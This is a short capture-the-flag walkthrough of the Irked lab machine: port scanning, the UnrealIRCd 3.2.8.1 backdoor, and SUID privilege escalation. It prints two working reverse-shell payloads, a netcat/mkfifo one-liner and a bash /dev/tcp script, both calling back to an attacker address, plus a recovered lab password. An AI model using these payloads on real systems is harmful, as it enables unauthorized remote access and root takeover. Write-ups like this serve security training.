# Irked (`10.10.10.117`)

## Summary

## Enumeration


![](img/2020-10-12-06-02-26.png)

```bash
$ sudo nmap -A -v -p 22,80,111,6697,8067,59054,65534 -Pn -oA allports irked.htb
```

![](img/2020-10-12-06-05-43.png)

`djmardov@irked.htb`

I see that IRC is running. I connect to it with `HexChat`.

![](img/2020-10-17-22-36-18.png)

I see that `UnrealIRC 3.2.8.1` is running. I find an exploit for this version.

![](img/2020-10-17-22-37-16.png)

https://www.exploit-db.com/exploits/13853

![](img/2020-10-17-22-39-08.png)


## Reverse Shell

![](img/2020-10-17-23-11-03.png)

![](img/2020-10-17-23-11-11.png)

`AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.22 443 >/tmp/f`

## Privilege Escalation

![](img/2020-10-17-23-15-18.png)

![](img/2020-10-17-23-51-13.png)

`UPupDOWNdownLRlrBAbaSSss`

Can't download or transfer the image file for some reason.... stole this step from a walkthrough.

User password: `Kab6h+m+bbp2J:HG`

![](img/2020-10-22-19-38-30.png)

I find a non-standard SUID file `/usr/bin/viewuser`. I run it and see the following output.

![](img/2020-10-23-13-52-13.png)

I drop a reverse shell script in the `/tmp/listusers` location and get a reverse shell as `root`.

```bash
#!/bin/bash
bash -i >&/dev/tcp/10.10.14.22/443 0>&1
```

![](img/2020-10-23-13-54-18.png)
